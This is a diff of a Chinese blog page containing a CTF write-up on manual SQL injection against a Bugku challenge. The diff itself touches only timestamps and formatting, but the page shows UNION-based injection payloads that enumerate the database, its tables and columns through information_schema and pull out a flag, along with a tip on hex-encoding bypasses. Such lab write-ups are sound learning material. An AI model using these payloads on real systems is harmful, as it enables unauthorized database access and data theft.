@@ -64,7 +64,7 @@
 <meta property="og:image" content="http://yoursite.com/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/3.png">
 <meta property="og:image" content="http://yoursite.com/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/4.png">
 <meta property="og:image" content="http://yoursite.com/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/5.png">
-<meta property="og:updated_time" content="2020-01-09T12:16:19.986Z">
+<meta property="og:updated_time" content="2020-01-09T12:18:50.458Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="简单的sql手工注入">
 <meta name="twitter:description" content="引言基于bugku上的题目复习一下sql手工注入 2333………… 题目链接：http://123.206.87.240:8002/chengjidan/">
@@ -222,7 +222,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-01-09 18:28:37 / 修改时间：20:16:19" itemprop="dateCreated datePublished" datetime="2020-01-09T18:28:37+08:00">2020-01-09</time>
+              <time title="创建时间：2020-01-09 18:28:37 / 修改时间：20:18:50" itemprop="dateCreated datePublished" datetime="2020-01-09T18:28:37+08:00">2020-01-09</time>
             </span>
 
           
@@ -245,12 +245,12 @@
 <h6 id="查询当前数据库名称-‘-union-select-1-2-3-database"><a href="#查询当前数据库名称-‘-union-select-1-2-3-database" class="headerlink" title="查询当前数据库名称       ‘ union select 1,2,3,database()#"></a><strong>查询当前数据库名称</strong>       ‘ union select 1,2,3,database()#</h6><p><img src="/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/2.png" alt></p>
 <p><strong>知道数据库了，就继续往下查表</strong>    <em>‘ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</em></p>
 <p><img src="/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/3.png" alt></p>
-<p><strong>*知道表了都，那就查列爆数据了呗!</strong>   ‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p>
+<p><strong><em>知道表了都，那就查列爆数据了呗</em></strong>   ‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p>
 <hr>
 <p> <em>Ps : 表的名称可用’ ‘引上，16进制或其他方式绕过</em></p>
 <hr>
 <p><img src="/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/4.png" alt></p>
-<p>最后查数据   ‘ union select 1,2,3,skctf_flag from fl4g#</p>
+<p>最后查数据    ‘ union select 1,2,3,skctf_flag from fl4g#</p>
 <p><img src="/images/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/5.png" alt></p>
 <h1 id="自己的理解最重要！"><a href="#自己的理解最重要！" class="headerlink" title="自己的理解最重要！"></a>自己的理解最重要！</h1>
     </div>
